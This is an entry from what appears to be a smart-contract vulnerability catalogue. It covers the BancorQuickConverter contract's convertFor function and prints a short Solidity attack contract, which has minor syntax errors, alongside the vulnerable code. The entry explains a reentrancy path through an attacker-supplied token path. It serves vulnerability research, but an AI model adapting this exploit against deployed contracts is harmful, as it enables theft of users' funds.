#########
Attack 06
#########

**Contract Name**

BancorQuickConverter

**Contract Address**

0x1a5f170802824e44181b6727e5447950880187ab

**Transaction Count**

0

**Invovled Ethers**

0 Ethers

**Length of the Call Chain**

1 external function

**Victim Function**

``convertFor``

**Attack Mechanisim**

Attack code:
::

    contract Attack is IERC20Token{
        BancorQuickConverter b = new BancorQuickConverter();
        constructor() payable {}
        IERC20Token[] _path

        function setPath() {
            _path[0] = Attack(this);
            _path[1] = Attack(this);
            _path[2] = Attack(this);
        }

        function deposit() public {  
            b.convertFor.value(10)(_path, 10, 0, this);
        }

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

    contract IERC20Token is IEtherToken {}
    contrac IEtherToken{}

Attacked code:
::

    contract BancorQuickConverter {
        ...
        modifier validConversionPath() {
            require(_path.length > 2 && _path.length <= (1 + 2 * 10) && _path.length % 2 == 1);
            _;
        }

        function convertFor(IERC20Token[] _path, uint256 _amount, uint256 _minReturn, address _for)
            public
            payable
            validConversionPath(_path)
            returns (uint256)
        {
            // if ETH is provided, ensure that the amount is identical to _amount and verify that the source token is an ether token
            IERC20Token fromToken = _path[0];
            require(msg.value == 0 || (_amount == msg.value && etherTokens[fromToken]));

            ISmartToken smartToken;
            IERC20Token toToken;
            ITokenConverter converter;
            uint256 pathLength = _path.length;

            if (msg.value > 0)
                IEtherToken(fromToken).deposit.value(msg.value)();

            for (uint256 i = 1; i < pathLength; i += 2) {
                smartToken = ISmartToken(_path[i]);
                toToken = _path[i + 1];
                converter = ITokenConverter(smartToken.owner());

                if (smartToken != fromToken)
                    ensureAllowance(fromToken, converter, _amount);

                _amount = converter.change(fromToken, toToken, _amount, i == pathLength - 2 ? _minReturn : 1);
                fromToken = toToken;
            }

            if (etherTokens[toToken])
                IEtherToken(toToken).withdrawTo(_for, _amount);
            else
                assert(toToken.transfer(_for, _amount));

            return _amount;
        }
        ...
    }

In this case, the attacker can lauch reentrancy attack by calling ``IEtherToken(fromToken).deposit.value(msg.value)();``. The parameter ``fromToken`` is not carefully checked and can be easily changed by visitors. Visitor can modify the value of ``_path`` by passing an arbitrary parameter. Since ``fromToken`` is assigned by ``_path``, the value of ``fromToken`` is modified after ``_path``.

**Attack.** The attacker call ``setPath`` function to specify the array ``_path``, and call ``deposit`` to start attack.